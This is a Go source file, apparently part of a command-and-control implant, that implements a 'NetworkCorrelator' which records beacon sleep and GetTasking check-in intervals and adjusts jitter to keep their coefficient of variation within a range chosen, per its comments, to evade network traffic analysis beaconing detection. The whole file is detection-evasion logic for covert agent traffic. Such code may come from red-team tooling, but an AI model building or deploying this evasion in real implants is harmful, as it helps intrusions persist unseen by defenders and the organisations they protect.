package commands

import (
	"math"
	"sync"
	"time"
)

// NetworkCorrelator tracks actual callback timing patterns and adjusts sleep
// intervals to avoid statistical anomaly detection. It builds a histogram of
// recent sleep durations and can suggest timing that blends with observed patterns.
//
// Two sample streams are tracked:
//   - sleep samples: raw time.Sleep durations (what the agent intended)
//   - checkin intervals: wall-clock time between successive GetTasking calls
//     (what NTA tools observe on the wire, includes task execution + network RTT)
//
// Adaptation decisions use checkin intervals because that's the network-visible
// signal. Sleep samples remain available for internal diagnostics.
type NetworkCorrelator struct {
	mu             sync.Mutex
	samples        []int64 // recent sleep durations in milliseconds
	checkinSamples []int64 // recent checkin intervals in milliseconds
	lastCheckin    time.Time
	maxSamples     int

	// Target CV range for adaptation. CV < targetCVMin triggers jitter increase;
	// CV > targetCVMax triggers decrease. These are tuned for typical NTA detection
	// thresholds (commercial tools flag CV < 0.05-0.10 as beaconing).
	targetCVMin float64
	targetCVMax float64
}

// NewNetworkCorrelator creates a correlator that tracks the last N samples.
func NewNetworkCorrelator(maxSamples int) *NetworkCorrelator {
	if maxSamples < 10 {
		maxSamples = 50
	}
	return &NetworkCorrelator{
		samples:        make([]int64, 0, maxSamples),
		checkinSamples: make([]int64, 0, maxSamples),
		maxSamples:     maxSamples,
		targetCVMin:    0.10,
		targetCVMax:    0.40,
	}
}

// RecordSleep records an actual sleep duration for pattern analysis.
func (nc *NetworkCorrelator) RecordSleep(d time.Duration) {
	nc.mu.Lock()
	defer nc.mu.Unlock()

	ms := d.Milliseconds()
	nc.samples = append(nc.samples, ms)
	if len(nc.samples) > nc.maxSamples {
		nc.samples = nc.samples[len(nc.samples)-nc.maxSamples:]
	}
}

// SampleCount returns the number of recorded samples.
func (nc *NetworkCorrelator) SampleCount() int {
	nc.mu.Lock()
	defer nc.mu.Unlock()
	return len(nc.samples)
}

// Stats returns mean, stddev, and coefficient of variation (CV) of recorded sleep samples.
// CV < 0.1 means very regular (suspicious), CV > 0.3 means good variation.
func (nc *NetworkCorrelator) Stats() (mean, stddev, cv float64) {
	nc.mu.Lock()
	defer nc.mu.Unlock()
	return computeStats(nc.samples)
}

// SuggestJitter analyzes the timing pattern and suggests jitter adjustments
// to avoid detection by network anomaly detectors. Returns:
//   - suggested jitter percentage (0-100)
//   - reason string explaining the suggestion
//   - whether an adjustment is recommended
func (nc *NetworkCorrelator) SuggestJitter(currentJitter int) (int, string, bool) {
	_, _, cv := nc.Stats()
	n := nc.SampleCount()

	if n < 10 {
		return currentJitter, "insufficient samples for analysis", false
	}

	// CV thresholds for detection risk
	switch {
	case cv < 0.05:
		// Very regular — easily detectable. Increase jitter significantly.
		suggested := currentJitter + 15
		if suggested > 50 {
			suggested = 50
		}
		return suggested, "timing too regular (CV<0.05) — increase jitter to avoid statistical detection", true

	case cv < 0.10:
		// Somewhat regular. Slight increase recommended.
		suggested := currentJitter + 5
		if suggested > 50 {
			suggested = 50
		}
		return suggested, "timing slightly regular (CV<0.10) — minor jitter increase recommended", true

	case cv > 0.50:
		// Too variable — may trigger anomaly detection for erratic patterns.
		suggested := currentJitter - 10
		if suggested < 5 {
			suggested = 5
		}
		return suggested, "timing too erratic (CV>0.50) — reduce jitter for more consistent pattern", true

	default:
		return currentJitter, "timing pattern within normal range", false
	}
}

// RecordCheckIn should be called at the start of each GetTasking poll. It records
// the wall-clock interval since the last call, which is the network-visible signal
// that NTA tools analyze (includes sleep + task execution + network round-trip).
func (nc *NetworkCorrelator) RecordCheckIn() {
	nc.mu.Lock()
	defer nc.mu.Unlock()

	now := time.Now()
	if !nc.lastCheckin.IsZero() {
		ms := now.Sub(nc.lastCheckin).Milliseconds()
		nc.checkinSamples = append(nc.checkinSamples, ms)
		if len(nc.checkinSamples) > nc.maxSamples {
			nc.checkinSamples = nc.checkinSamples[len(nc.checkinSamples)-nc.maxSamples:]
		}
	}
	nc.lastCheckin = now
}

// CheckInCount returns the number of recorded check-in interval samples.
func (nc *NetworkCorrelator) CheckInCount() int {
	nc.mu.Lock()
	defer nc.mu.Unlock()
	return len(nc.checkinSamples)
}

// CheckInStats returns mean, stddev, and CV of check-in intervals.
func (nc *NetworkCorrelator) CheckInStats() (mean, stddev, cv float64) {
	nc.mu.Lock()
	defer nc.mu.Unlock()
	return computeStats(nc.checkinSamples)
}

func computeStats(samples []int64) (mean, stddev, cv float64) {
	n := len(samples)
	if n < 2 {
		return 0, 0, 0
	}

	var sum float64
	for _, s := range samples {
		sum += float64(s)
	}
	mean = sum / float64(n)

	var sumSq float64
	for _, s := range samples {
		diff := float64(s) - mean
		sumSq += diff * diff
	}
	stddev = math.Sqrt(sumSq / float64(n-1))

	if mean > 0 {
		cv = stddev / mean
	}
	return mean, stddev, cv
}

// AdaptSleep adjusts the sleep duration based on the observed check-in interval
// pattern. Unlike CorrelatedSleep (which passively blends toward the mean), this
// actively increases or decreases variance to keep the coefficient of variation
// within a target range that evades NTA statistical detection.
//
// Returns the adjusted sleep duration. The adjustment is bounded:
//   - Never reduces sleep below 50% of base (avoids resource exhaustion)
//   - Never increases sleep beyond 200% of base (avoids unresponsiveness)
//   - Requires at least 15 check-in samples before adapting (cold start)
func (nc *NetworkCorrelator) AdaptSleep(baseDuration time.Duration) time.Duration {
	nc.mu.Lock()
	checkinCount := len(nc.checkinSamples)
	var cv float64
	if checkinCount >= 2 {
		_, _, cv = computeStats(nc.checkinSamples)
	}
	nc.mu.Unlock()

	if checkinCount < 15 {
		return baseDuration
	}

	baseMs := float64(baseDuration.Milliseconds())
	adjustedMs := baseMs

	if cv < nc.targetCVMin {
		// Too regular — NTA tools will flag this as beaconing.
		// Add extra random variance: scale up by 1.0 to 1.5.
		// The magnitude increases as CV drops further below target.
		deficit := nc.targetCVMin - cv
		maxBoost := 0.5
		boost := 1.0 + (deficit/nc.targetCVMin)*maxBoost*cryptoFloat64()
		adjustedMs = baseMs * boost
	} else if cv > nc.targetCVMax {
		// Too erratic — some NTA tools flag high-variance periodic traffic too.
		// Dampen by scaling down: 0.8 to 1.0.
		excess := cv - nc.targetCVMax
		maxDampen := 0.2
		dampen := 1.0 - (excess/(1.0-nc.targetCVMax))*maxDampen
		if dampen < 0.8 {
			dampen = 0.8
		}
		adjustedMs = baseMs * dampen
	}

	// Enforce bounds: 50% to 200% of base
	minMs := baseMs * 0.5
	maxMs := baseMs * 2.0
	if adjustedMs < minMs {
		adjustedMs = minMs
	}
	if adjustedMs > maxMs {
		adjustedMs = maxMs
	}
	if adjustedMs < 1000 {
		adjustedMs = 1000
	}

	return time.Duration(adjustedMs) * time.Millisecond
}

// CorrelatedSleep calculates a sleep duration that factors in the timing histogram.
// If correlation has enough data, it slightly biases the sleep toward the observed
// mean to maintain a more natural-looking pattern.
//
// Deprecated: Use AdaptSleep instead, which uses check-in intervals (not sleep-only
// samples) and actively adjusts variance instead of passively blending toward the mean.
func (nc *NetworkCorrelator) CorrelatedSleep(baseDuration time.Duration) time.Duration {
	mean, _, _ := nc.Stats()
	n := nc.SampleCount()

	if n < 10 || mean == 0 {
		return baseDuration
	}

	baseMs := float64(baseDuration.Milliseconds())
	blended := baseMs*0.8 + mean*0.2

	if blended < 1000 {
		blended = 1000
	}

	return time.Duration(blended) * time.Millisecond
}
